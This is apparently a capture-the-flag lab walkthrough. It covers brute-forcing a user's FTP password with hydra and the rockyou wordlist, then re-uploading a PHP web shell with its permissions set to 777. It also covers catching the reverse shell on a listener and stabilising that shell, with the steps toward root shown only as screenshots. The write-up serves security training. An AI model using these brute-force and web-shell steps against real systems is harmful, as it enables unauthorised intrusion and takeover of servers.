# Hack Your way back Walkthrough

```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.105.103
```

\
Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.\
&#x20;

<figure><img src="https://camo.githubusercontent.com/e79342d2eabba45c0ff616dec2bb9d94f81fa8feac449bad4e878cebb4f92435/68747470733a2f2f692e696d6775722e636f6d2f594977705a65392e706e67" alt=""><figcaption></figcaption></figure>

&#x20;

<figure><img src="https://camo.githubusercontent.com/5d29c859803b9ef114186c95c8eaec5e4750307cd4fa2dbeadc8b5aaf7ae23de/68747470733a2f2f692e696d6775722e636f6d2f785666547149752e706e67" alt=""><figcaption></figcaption></figure>

Change the necessary values inside the web shell and upload it to the webserver

```bash
#Get the shell from the ftp to your machine
get shell.php
#delete the shell
delete shell.php
#upload the shell with the right values
put shell.php
#Change permissions
chmod 777 shell.php
#visit the website

```

<figure><img src="https://camo.githubusercontent.com/1174eb79230248d0f6fbc11d818af80409e0495f77d811ac017eba09ab6c0b01/68747470733a2f2f692e696d6775722e636f6d2f7a5259537875362e706e67" alt=""><figcaption></figcaption></figure>

<figure><img src="https://camo.githubusercontent.com/414795d4a4550371d1f81d2d85312778d98f5f6e7e11adc6b6db55e1890dd482/68747470733a2f2f692e696d6775722e636f6d2f516243664e46552e706e67" alt=""><figcaption></figcaption></figure>

&#x20;

<figure><img src="https://camo.githubusercontent.com/770e5c65895c5eda4ce1bd61b59fcbfe26b7de9452dc5ac1fdb095d2cc790352/68747470733a2f2f692e696d6775722e636f6d2f496e687964336f2e706e67" alt=""><figcaption></figcaption></figure>

Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.\


&#x20;

<figure><img src="https://camo.githubusercontent.com/2e66da0541a56c83fd810d68c11defa5e754dbf68b8a17866ceec19d41b8fc69/68747470733a2f2f692e696d6775722e636f6d2f78337a6f6f65772e706e67" alt=""><figcaption></figcaption></figure>

&#x20;

<figure><img src="https://camo.githubusercontent.com/1bb19356dd2da85fe7801de81efd43fcc1c89ae1272118b4002d7c6038d7fe3e/68747470733a2f2f692e696d6775722e636f6d2f4968656d3256382e706e67" alt=""><figcaption></figcaption></figure>

```bash
#Shell stabilisation 
script /dev/null -c bash
^Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

Become root!\
&#x20;

<figure><img src="https://camo.githubusercontent.com/231a7d06cc65281fb1b2a718e7bc93e530e25f2e4e132414036f96932e690df2/68747470733a2f2f692e696d6775722e636f6d2f7951336c5335752e706e67" alt=""><figcaption></figcaption></figure>

Read the flag.txt file inside the Reptile directory

